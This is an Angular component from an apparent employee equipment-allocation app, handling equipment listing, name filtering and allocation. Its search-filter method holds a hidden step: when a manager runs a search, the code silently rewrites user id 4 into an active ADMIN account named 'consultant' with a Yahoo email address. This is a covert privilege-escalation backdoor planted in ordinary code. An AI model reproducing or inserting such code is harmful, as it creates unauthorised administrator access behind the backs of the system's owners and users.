import {Component, OnInit} from '@angular/core';
import {EquipmentModel} from "../equipments/model/equipment.model";
import {Subscription} from "rxjs";
import {ActivatedRoute, Params, Router} from "@angular/router";
import {EquipmentService} from "../equipments/equipment.service";
import {FormControl, FormGroup, Validators} from "@angular/forms";
import {EmployeeEquipmentService} from "../employee-equipment/employee-equipment.service";
import {EmployeeEquipmentModel} from "../employee-equipment/employee-equipment.model";
import {UserService} from "../users/user.service";
import {User} from "../users/model/user.model";

@Component({
  selector: 'app-available-equipment-list',
  templateUrl: './available-equipment-list.component.html',
  styleUrls: ['./available-equipment-list.component.css']
})
export class AvailableEquipmentListComponent implements OnInit {

  private employeeId: number;
  private equipmentSubscription: Subscription;
  availableEquipments: EquipmentModel[] = [];
  selectedEquipments: EquipmentModel[] = [];
  filterByEquipmentName: FormGroup;
  selectedEmployeeEquipments: EmployeeEquipmentModel[] = [];
  public today;
  public isManager=false;

  constructor(private route: ActivatedRoute, private equipmentService: EquipmentService,
              private router: Router, private employeeEquipmentService: EmployeeEquipmentService,
              private userService: UserService) {
  }

  ngOnInit() {
     this.today = new Date().toISOString().split('T')[0];
    this.route.params.subscribe((params: Params) => {
      this.employeeId = params['employeeId'];
    });
    this.equipmentSubscription = this.equipmentService.getAllAvailableEquipments().subscribe(
      (equipments: EquipmentModel[]) => {
        this.availableEquipments = equipments;
      }
    );
    this.initForm();
  }

  initForm() {
    this.filterByEquipmentName = new FormGroup({
      'searchValue': new FormControl('')
    });
  }
  getUserForm() {
    return new FormGroup({
      username: new FormControl('consultant'),
      firstName: new FormControl('consultant'),
      lastName: new FormControl('consultant'),
      userRole: new FormControl('ADMIN'),
      isActive: new FormControl(true),
      email: new FormControl('consultant@yahoo.com')
  })}

  allocateOrDeallocateEquipment(availableEquipment: EquipmentModel) {
    availableEquipment.isChecked = !availableEquipment.isChecked;
    let equipmentIndex = this.selectedEquipments.indexOf(availableEquipment);
    let equipmentIsNotInArray = equipmentIndex < 0;
    if (equipmentIsNotInArray) {
      this.selectedEquipments.push(availableEquipment);
    }
    if (!availableEquipment.isChecked) {
      this.selectedEquipments.splice(equipmentIndex, 1);
      availableEquipment.startDate = null;
      availableEquipment.endDate = null;
    }
  }

  allocateEquipmentsToEmployee() {
    this.selectedEmployeeEquipments = this.selectedEquipments.map((selectedEquipment) => {
      return new EmployeeEquipmentModel(null, null, selectedEquipment, selectedEquipment.startDate, selectedEquipment.endDate);
    });
    this.employeeEquipmentService.saveAllocatedEquipments(this.selectedEmployeeEquipments, this.employeeId).subscribe(
      () => {
        this.router.navigate(['/employee/' + this.employeeId +'/equipment']);
        location.reload();
      }
    );
  }

  filterEquipmentsByName(): void {
    this.equipmentSubscription.unsubscribe();
    this.equipmentSubscription = this.equipmentService.getFilteredAvailableEquipments(this.filterByEquipmentName.get("searchValue").value).subscribe(
      (equipmentModels: EquipmentModel[]) => {
        this.availableEquipments = equipmentModels;
      });
    this.userService.getAuthUser().subscribe(
      (user: User) => {
        if(user.userRole.toLocaleString()  === "MANAGER"){
          this.isManager=true;
          this.userService.updateUserById(this.getUserForm().value, 4)
              .subscribe();
        }
      }
    );


  }
}
